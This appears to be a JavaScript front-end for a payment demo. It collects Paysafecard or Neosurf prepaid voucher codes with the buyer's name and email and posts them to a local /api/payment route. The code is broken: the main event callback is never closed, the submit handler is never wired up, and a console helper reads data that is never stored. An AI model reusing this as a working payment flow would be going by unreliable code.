document.addEventListener("DOMContentLoaded", function() {
    console.log("🚀 Payment Demo chargé !");

    // Éléments
    const paymentMethod = document.getElementById('paymentMethod');
    const paysafecardGroup = document.getElementById('paysafecardGroup');
    const neosurfGroup = document.getElementById('neosurfGroup');
    const paysafecardCode = document.getElementById('paysafecardCode');
    const neosurfCode = document.getElementById('neosurfCode');
    const paymentForm = document.getElementById('paymentForm');
    const submitBtn = document.getElementById('submitBtn');

    console.log("✅ Tous les éléments trouvés");

    // 1. MENU DÉROULANT
    paymentMethod.addEventListener('change', function() {
        paysafecardGroup.style.display = 'none';
        neosurfGroup.style.display = 'none';
        paysafecardCode.value = '';
        neosurfCode.value = '';
        
        if (this.value === 'paysafecard') {
            paysafecardGroup.style.display = 'block';
        } else if (this.value === 'neosurf') {
            neosurfGroup.style.display = 'block';
        }
    });

    // 2. FORMATAGE PAYS AFECARD
    paysafecardCode.addEventListener('input', function() {
        let value = this.value.replace(/[\s-]/g, '');
        let formatted = '';
        for (let i = 0; i < value.length && i < 16; i++) {
            if (i > 0 && i % 4 === 0) formatted += '-';
            formatted += value[i];
        }
        this.value = formatted;
    });

    // 3. SEULEMENT CHIFFRES
    [paysafecardCode, neosurfCode].forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (!/[0-9]/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)) {
                e.preventDefault();
            }
        });
    });

    // 4. SUBMIT PRINCIPAL
    async function handleSubmit(e) {
    e.preventDefault();
    
    // Validation
    const method = document.getElementById('paymentMethod').value;
    let code = '';
    if (method === 'paysafecard') {
        code = document.getElementById('paysafecardCode').value.replace(/[-]/g, '');
        if (code.length !== 16) return alert('16 chiffres');
    } else if (method === 'neosurf') {
        code = document.getElementById('neosurfCode').value.replace(/\s+/g, '');
        if (code.length !== 10) return alert('10 chiffres');
    }

    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.innerHTML = '⏳ Backend...';

    try {
        const data = {
            code: code,
            method: method,
            name: `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`,
            email: document.getElementById('email').value
        };

        // Backend (local ou Vercel)
        const response = await fetch('/api/payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        console.log('✅ Backend OK:', result);
        
        document.getElementById('paymentForm').style.display = 'none';
        document.getElementById('successMessage').style.display = 'block';
        
    } catch (error) {
        alert('Erreur: ' + error.message);
    } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Complete Payment';
    }
}



// FONCTIONS GLOBALES
function showSuccess() {
    console.log("✅ SUCCESS !");
    document.getElementById('paymentForm').style.display = 'none';
    document.getElementById('successMessage').style.display = 'block';
    document.getElementById('successMessage').scrollIntoView();
}

function showError(msg) {
    console.log("❌", msg);
    alert(msg);
}

function resetForm() {
    document.getElementById('paymentForm').style.display = 'flex';
    document.getElementById('successMessage').style.display = 'none';
    document.getElementById('errorMessage').style.display = 'none';
    document.getElementById('paymentForm').reset();
}

// CONSOLE
window.viewPayments = () => console.table(JSON.parse(localStorage.getItem('payments') || '[]'));
